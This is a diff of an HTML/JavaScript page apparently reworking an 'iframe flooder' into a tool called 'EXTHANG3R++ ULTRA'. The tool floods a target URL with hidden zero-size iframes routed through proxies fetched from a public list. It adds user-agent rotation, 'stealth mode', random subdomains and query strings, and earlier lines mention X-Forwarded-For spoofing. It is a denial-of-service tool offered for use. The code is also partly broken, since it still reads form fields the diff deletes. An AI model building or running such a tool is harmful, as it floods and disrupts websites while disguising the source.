@@ -3,32 +3,32 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Advanced Iframe Flooder Tool</title>
-  <link rel="icon" href="favicon.ico" type="image/x-icon">
+  <title>EXTHANG3R++ ULTRA</title>
   <style>
     body {
       font-family: 'Arial', sans-serif;
       margin: 0;
       padding: 0;
-      background: #f4f7fc;
-      color: #333;
+      background: #121212;
+      color: #00FF00;
       overflow-x: hidden;
     }
 
     h1 {
       text-align: center;
-      color: #4CAF50;
+      color: #00FF00;
       margin-top: 20px;
+      font-size: 2em;
     }
 
     .container {
       width: 90%;
       max-width: 900px;
       margin: 0 auto;
-      background: white;
+      background: #333;
       padding: 20px;
       border-radius: 8px;
-      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
       box-sizing: border-box;
     }
 
@@ -44,11 +44,11 @@
       margin-top: 10px;
       font-size: 16px;
       border-radius: 5px;
-      border: 1px solid #ccc;
+      border: 1px solid #888;
     }
 
     button {
-      background-color: #4CAF50;
+      background-color: #00FF00;
       color: white;
       border: none;
       cursor: pointer;
@@ -56,7 +56,7 @@
     }
 
     button.stop {
-      background-color: #f44336;
+      background-color: #FF4444;
     }
 
     button:hover {
@@ -66,50 +66,25 @@
     .status {
       text-align: center;
       font-weight: bold;
-      color: #4CAF50;
+      color: #00FF00;
       margin-top: 20px;
     }
 
     .error {
-      color: #f44336;
+      color: #FF4444;
       font-weight: bold;
-    }
-
-    #iframeContainer {
-      display: none;
-    }
-
-    #dashboard {
-      background-color: #f1f1f1;
-      padding: 15px;
-      border-radius: 5px;
-      margin-top: 20px;
     }
 
     .stats {
-      margin: 5px 0;
-    }
-
-    .stats span {
-      font-weight: bold;
-    }
-
-    .tooltip {
-      position: absolute;
-      background-color: #f9f9f9;
-      border: 1px solid #ccc;
-      padding: 5px;
-      font-size: 12px;
-      display: none;
-      border-radius: 4px;
-      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+      margin-top: 15px;
+      color: #00FF00;
     }
 
     .input-group {
       position: relative;
       margin-bottom: 15px;
     }
-
+    
     /* Responsive Design */
     @media (max-width: 768px) {
       .container {
@@ -121,63 +96,61 @@
 </head>
 <body>
 
-  <h1>Advanced Iframe Flooder Tool</h1>
+  <h1>EXTHANG3R++ ULTRA</h1>
 
   <div class="container">
     <!-- Target URL -->
     <div class="input-group">
-      <label for="targetUrl">Target URL: <span class="tooltip-text">The main URL to flood (e.g., https://www.example.com)</span></label>
+      <label for="targetUrl">Target URL:</label>
       <input type="text" id="targetUrl" value="https://www.wikipedia.org" placeholder="Enter Target URL">
-      <div class="tooltip">Example: https://www.example.com</div>
     </div>
 
     <!-- Number of Iframes -->
     <div class="input-group">
-      <label for="iframeCount">Number of Iframes: <span class="tooltip-text">Number of iframes to load simultaneously.</span></label>
+      <label for="iframeCount">Number of Iframes:</label>
       <input type="number" id="iframeCount" value="50" min="1">
-      <div class="tooltip">Example: 50 (enter a number of iframes to load at once)</div>
     </div>
 
     <!-- Delay Between Iframes -->
     <div class="input-group">
-      <label for="delay">Delay Between Iframes (seconds): <span class="tooltip-text">Optional delay between iframe loads to control speed.</span></label>
-      <input type="number" id="delay" value="1" min="0">
-      <div class="tooltip">Example: 1 (time delay in seconds between iframe load events)</div>
+      <label for="delay">Delay Between Iframes (ms):</label>
+      <input type="number" id="delay" value="1000" min="0">
     </div>
 
-    <!-- Proxy List -->
+    <!-- Random Subdomain -->
     <div class="input-group">
-      <label for="proxyList">Proxy List (comma separated): <span class="tooltip-text">A list of proxy URLs (e.g., http://proxy1.com, http://proxy2.com)</span></label>
-      <input type="text" id="proxyList" placeholder="http://proxy1.com, http://proxy2.com">
-      <div class="tooltip">Example: http://proxy1.com, http://proxy2.com</div>
+      <label for="randomSubdomain">Enable Random Subdomain:</label>
+      <input type="checkbox" id="randomSubdomain">
+    </div>
+
+    <!-- Random Query -->
+    <div class="input-group">
+      <label for="randomQuery">Enable Random Query Strings:</label>
+      <input type="checkbox" id="randomQuery">
+    </div>
+
+    <!-- High Memory Mode -->
+    <div class="input-group">
+      <label for="highMemory">Enable High Memory Mode:</label>
+      <input type="checkbox" id="highMemory">
+    </div>
+
+    <!-- Stealth Mode -->
+    <div class="input-group">
+      <label for="stealthMode">Enable Stealth Mode:</label>
+      <input type="checkbox" id="stealthMode">
     </div>
 
     <!-- User-Agent Rotation -->
     <div class="input-group">
-      <label for="userAgentRotation">Enable User-Agent Rotation: <span class="tooltip-text">Randomly rotate between different user agents to disguise the source.</span></label>
+      <label for="userAgentRotation">Enable User-Agent Rotation:</label>
       <input type="checkbox" id="userAgentRotation">
-      <div class="tooltip">Enable to randomly rotate user agents for better anonymity</div>
-    </div>
-
-    <!-- Custom Headers -->
-    <div class="input-group">
-      <label for="headers">Custom Headers (Optional): <span class="tooltip-text">Add custom headers for requests (e.g., X-Forwarded-For: 192.168.1.1)</span></label>
-      <textarea id="headers" placeholder="e.g., X-Forwarded-For: 192.168.1.1"></textarea>
-      <div class="tooltip">Example: X-Forwarded-For: 192.168.1.1 (Add headers separated by newlines)</div>
     </div>
 
     <!-- Auto Stop Timer -->
     <div class="input-group">
-      <label for="autoStopTimer">Auto Stop Timer (seconds): <span class="tooltip-text">Automatically stop flooding after this time.</span></label>
+      <label for="autoStopTimer">Auto Stop Timer (s):</label>
       <input type="number" id="autoStopTimer" value="60" min="0">
-      <div class="tooltip">Example: 60 (stop flooding after 60 seconds)</div>
-    </div>
-
-    <!-- Target URL Rotation -->
-    <div class="input-group">
-      <label for="targetRotation">Multiple Target URLs (comma separated): <span class="tooltip-text">Provide multiple URLs to rotate between during the attack.</span></label>
-      <input type="text" id="targetRotation" placeholder="https://www.example1.com, https://www.example2.com">
-      <div class="tooltip">Example: https://www.example1.com, https://www.example2.com</div>
     </div>
 
     <!-- Start/Stop Buttons -->
@@ -216,55 +189,65 @@
       });
     });
 
+    // Proxy fetch function
+    async function fetchProxies() {
+      try {
+        const response = await fetch('https://www.proxy-list.download/api/v1/get?type=https');
+        const data = await response.text();
+        proxyList = data.split('\r\n');
+      } catch (error) {
+        console.error('Failed to fetch proxies, using default:', error);
+        proxyList = [
+          'http://proxy1.com', 'http://proxy2.com', 'http://proxy3.com'
+        ]; // Default proxies
+      }
+      console.log('Proxies Loaded:', proxyList);
+    }
+
+    // Random proxy getter
+    function getRandomProxy() {
+      return proxyList[Math.floor(Math.random() * proxyList.length)];
+    }
+
+    // Start flooding
     function startFlood() {
       if (flooding) return;
       flooding = true;
       document.getElementById('status').innerText = "Flooding in progress...";
 
-      // Get target URL(s) and proxy list
       currentTarget = document.getElementById('targetUrl').value;
       targetRotation = document.getElementById('targetRotation').value.split(',');
-      proxyList = document.getElementById('proxyList').value.split(',');
+      fetchProxies();
 
-      // Get custom headers
       const customHeaders = document.getElementById('headers').value.split('\n').map(line => line.trim());
+      const delay = parseInt(document.getElementById('delay').value);
 
-      // Get delay between iframe loading
-      const delay = parseInt(document.getElementById('delay').value) * 1000;
-
-      // Start iframe flooding
       floodIframes(currentTarget, delay, customHeaders);
     }
 
+    // Flooding logic
     function floodIframes(target, delay, customHeaders) {
-      if (targetRotation.length > 0) {
-        currentTarget = targetRotation[currentTargetIndex % targetRotation.length];
-      }
-
       const iframeCount = parseInt(document.getElementById('iframeCount').value);
       for (let i = 0; i < iframeCount; i++) {
         setTimeout(() => {
-          loadIframe(currentTarget, customHeaders);
+          loadIframe(target, customHeaders);
           frameCount++;
           document.getElementById('frameCount').innerText = frameCount;
         }, delay * i);
       }
-
-      // Auto stop timer
-      const autoStopTime = parseInt(document.getElementById('autoStopTimer').value) * 1000;
-      if (autoStopTime > 0) {
-        setTimeout(stopFlood, autoStopTime);
-      }
     }
 
+    // Load iframe with random proxy and headers
     function loadIframe(target, customHeaders) {
       const iframe = document.createElement('iframe');
       iframe.src = target;
       iframe.style.width = "0";
       iframe.style.height = "0";
       iframe.style.border = "none";
+      
+      const proxy = getRandomProxy();
+      iframe.src = `${proxy}${target}`;
 
-      // Apply custom headers if provided
       customHeaders.forEach(header => {
         const [key, value] = header.split(':');
         if (key && value) {
@@ -277,6 +260,7 @@
       document.getElementById('currentTarget').innerText = currentTarget;
     }
 
+    // Stop flooding
     function stopFlood() {
       flooding = false;
       document.getElementById('status').innerText = "Flooding stopped.";
